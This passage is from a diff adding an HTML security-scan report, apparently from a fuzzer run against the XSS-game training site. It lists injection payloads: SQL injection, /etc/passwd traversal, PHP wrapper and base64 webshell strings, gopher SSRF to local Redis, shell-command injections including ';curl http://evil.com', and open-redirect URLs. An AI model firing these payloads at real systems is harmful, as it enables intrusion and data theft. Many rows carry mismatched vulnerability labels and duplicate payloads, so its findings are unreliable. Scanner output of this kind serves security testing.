+  "query": "javascript:window.xssFlag=1"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0027 UNION SELECT NULL--"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "1 WAITFOR DELAY \u00270:0:5\u0027--"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "1 OR SLEEP(5)--"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0027 OR \u00271\u0027=\u00271\u0027 /*"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0027%20OR%201=1--"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0027/**/OR/**/1=1--"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../../../../../../etc/passwd%00"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../../../../../../etc/passwd%00"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../../../../../../etc/passwd%00"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/....//....//etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/....//....//etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/....//....//etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "php://filter/convert.base64-encode/resource=index.php"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "php://filter/convert.base64-encode/resource=index.php"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://127.0.0.1:80/"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "file:///etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "file:///etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "file:///etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "$(whoami)"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "`whoami`"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";cat /etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";cat /etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";cat /etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";curl http://evil.com"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "id=1\u0026id=2"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "admin=true"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "//evil.com"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "https://trusted.com/evil.com"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/redirect?url=http://malicious.com"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4="
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4="
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "expect://id"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "expect://id"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://evil.com#@trusted.com"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://trusted.com@evil.com"
+}</pre></td>
+          </tr>
+          
+          
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <script>
+    const severityCounts = {"Critical": 70, "High": 69};
+    const labels = Object.keys(severityCounts);
+    const dataValues = Object.values(severityCounts);
+
+    const ctx = document.getElementById('chart').getContext('2d');
+    new Chart(ctx, {
+      type: 'doughnut',
+      data: {
+        labels: labels,
+        datasets: [{
+          data: dataValues,
+          backgroundColor: ['#dc3545', '#fd7e14', '#ffc107', '#198754', '#6c757d']
+        }]
+      },
+      options: {
+        responsive: true,
+        maintainAspectRatio: false,
+        plugins: {
+          legend: {
+            position: 'bottom'
+          }
+        }
+      }
+    });
+  </script>
+</body>
+</html>
